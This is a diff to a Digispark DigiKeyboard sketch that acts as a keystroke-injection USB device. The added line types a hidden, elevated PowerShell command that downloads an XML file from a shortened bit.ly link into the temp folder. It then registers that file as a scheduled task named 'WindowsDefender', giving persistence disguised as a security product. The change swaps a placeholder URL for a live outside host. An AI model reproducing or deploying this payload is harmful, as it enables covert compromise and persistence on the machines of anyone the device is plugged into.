@@ -7,7 +7,7 @@ void setup() {
 
 void loop() {
   // this is generally not necessary but with some older systems it seems to
-  // prevent missing the first character after a delay
+  // prevent missing the first character after a delay:
   DigiKeyboard.sendKeyStroke(0);
   
   DigiKeyboard.delay(3000);
@@ -16,7 +16,7 @@ void loop() {
 
   DigiKeyboard.delay(500);
 
-  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"`$client = New-Object System.Net.WebClient; `$client.DownloadFile('$url', `$env:temp + '\\sys.xml'); sleep 5; schtasks /create /XML `$env:temp\\sys.xml /tn syscheck01\\\" -WindowStyle Hidden -Verb RunAs");
+  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"`$client = New-Object System.Net.WebClient; `$client.DownloadFile('http://bit.ly/2jfL69K', `$env:temp + '\\s.xml');sleep 5;schtasks /create /XML `$env:temp\\s.xml /tn WindowsDefender\\\" -WindowStyle Hidden -Verb RunAs");
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
